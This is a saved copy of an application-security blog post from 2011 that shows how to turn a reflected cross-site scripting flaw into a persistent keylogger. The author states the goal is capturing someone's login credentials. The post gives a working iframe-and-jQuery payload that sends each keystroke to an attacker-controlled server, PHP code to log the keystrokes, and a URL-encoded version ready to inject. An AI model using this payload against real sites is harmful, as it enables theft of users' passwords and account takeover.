<!DOCTYPE html>
<!-- saved from url=(0070)https://www.idontplaydarts.com/2011/05/javascript-keylogger-in-jquery/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><link rel="shortcut icon" type="image/png" href="https://www.idontplaydarts.com/static/favicon.png"><link rel="apple-touch-icon" href="https://www.idontplaydarts.com/static/favicon.png"><meta name="referrer" content="origin"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="A simple keylogger written in JQuery."><link rel="canonical" href="https://www.idontplaydarts.com/2011/05/javascript-keylogger-in-jquery/"><title>JavaScript keylogger in JQuery. | Application Security</title><link rel="stylesheet" href="./JavaScript keylogger in JQuery. _ Application Security_files/all.css"><link rel="alternate" type="application/rss+xml" title="Web Application Security Feed" href="https://www.idontplaydarts.com/feed/"></head><body><nav class="navbar navbar-inverse navbar-fixed-top"><div class="container"><div class="navbar-header"><button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><span class="sr-only">Toggle navigation</span><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a class="navbar-brand" href="https://www.idontplaydarts.com/">Application Security</a></div><div id="navbar" class="collapse navbar-collapse"><ul class="nav navbar-nav"><li class="active"><a href="https://www.idontplaydarts.com/">Blog</a></li><li><a href="https://www.idontplaydarts.com/contact">Contact</a></li></ul></div></div></nav><div class="container"><article class="hentry"><header><h1 class="entry-title">JavaScript keylogger in JQuery.</h1></header><footer class="post-info"><p>Published on <time class="published" datetime="2011-05-21 00:13:00+02:00">21-05-2011</time> by <span class="vcard author post-author"><a class="fn" href="https://www.idontplaydarts.com/contact/">phil</a></span></p></footer><div class="entry-content"><p>I needed to capture someone's login credentials using cross site scripting. However I had 3 problems. Firstly there was no XSS on the login page, secondly the only XSS was reflected, meaning it only affected the current page and thirdly the HTTPOnly flag was set on the session meaning I couldn't hijack it.</p><p>So I came up with a solution that turns reflected cross site scripting into a crude form of persistent XSS and records the users keystrokes to a remote server. The idea is that you embed some XSS code in a vulnerable page on the same domain as the login page. Its important that its on the same domain so that we can access the contents of the iframe and hook the keyboard input. If its not on the same domain then the browser won't let you do this.</p><p>The general architecture of the exploit looks something like this.</p><p><img alt="" src="./JavaScript keylogger in JQuery. _ Application Security_files/xss.png" style="width: 522px; height: auto; max-width: 100%;"></p><p>The page with XSS spawns an iframe that fills up the contents of the window and places it over the top of everything currently in the window. The src of the Iframe should be whatever page you want to capture keystrokes from. It then adds a hook to the contents of the iframe so that every time there is a key press it polls back to a server controlled by the attacker.</p><p>The great thing about using the Iframe is that the user can navigate away from the page and the keystroke logger will still be running as the src of the parent Iframe remains the same and it is the parent Iframe in which the key logger resides.</p><h2>The code</h2><p>I used JQuery as I wanted the Key logger to be cross browser compliant, if the site your targeting has JQuery already included then you wont have to embed JQuery and can avoid the script tags all together. I also included a time stamp when sending the keystroke to the remote server as occasionally the GET requests were arriving out of order - having a time stamp enables you to reassemble the keystrokes in the correct order server-side.</p><div class="codehilite"><pre><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"http://code.jquery.com/jquery-1.6.1.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"/login.php"</span> <span class="na">id=</span><span class="s">"w"</span> <span class="na">style=</span><span class="s">"width:100%; height:100%; position:absolute; top:0; left:0; z-index:2; background-color:#ffffff;"</span> <span class="na">onload=</span><span class="s">"$('#w').contents().keypress(function(event) {$.get('http://www.mysite.com/k.php?x='+event.which+'&amp;t='+event.timeStamp,function(data){});});"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</pre></div><p>You don't even need server side code to do the logging, as long as you have access to your web server error logs you should be able to see all the keystrokes arriving as GET requests. If you did want more friendly server-side code it might look something like this:</p><div class="codehilite"><pre><span class="nv">$f</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"/tmp/log.txt"</span><span class="p">,</span><span class="s2">"a+"</span><span class="p">);</span>
<span class="nb">fputs</span><span class="p">(</span><span class="nv">$f</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'t'</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span> <span class="o">.</span> <span class="nb">chr</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'x'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
</pre></div><h2>Encoding the payload:</h2><p>The full url encoded payload is shown below, both the initial Iframe src page and the destination script for the key strokes are marked in bold. Both will need to be changed if you are to use this.</p><div class="codehilite"><pre>%3Cscript+src%3D%22http%3A%2F%2Fcode.jquery.com%2Fjquery-1.6.1.min.js%22%3E%3C%2Fscript%3E%3Ciframe+src%3D%22%2Flogin.php%22+id%3D%22w%22+style%3D%22width%3A100%25%3B+height%3A100%25%3B+position%3Aabsolute%3B+top%3A0%3B+left%3A0%3B+z-index%3A2%3B+background-color%3A%23ffffff%3B%22+onload%3D%22%24%28%27%23w%27%29.contents%28%29.keypress%28function%28event%29+%7B%24.get%28%27http%3A%2F%2Fwww.mysite.com%2Fk.php%3Fx%3D%27%2Bevent.which%2B%27%26t%3D%27%2Bevent.timeStamp%2Cfunction%28data%29%7B%7D%29%3B%7D%29%3B%22%3E%3C%2Fiframe%3E
</pre></div></div><div class="related-content"><h3>Related articles</h3><ul><li>[02-10-2011] <a href="https://www.idontplaydarts.com/2011/10/javascript-and-daylight-savings-for-tracking-users/">JavaScript and Daylight Savings for tracking users.</a></li><li>[01-05-2011] <a href="https://www.idontplaydarts.com/2011/05/clickjacking-and-phishing-with-help-from-the-html5-javascript-sandbox/">Clickjacking and Phishing with help from the HTML5 JavaScript Sandbox</a></li></ul><div></div></div></article><div class="dQ1"></div></div><script type="text/javascript" async="" src="./JavaScript keylogger in JQuery. _ Application Security_files/ga.js"></script><script src="./JavaScript keylogger in JQuery. _ Application Security_files/p.js"></script></body></html>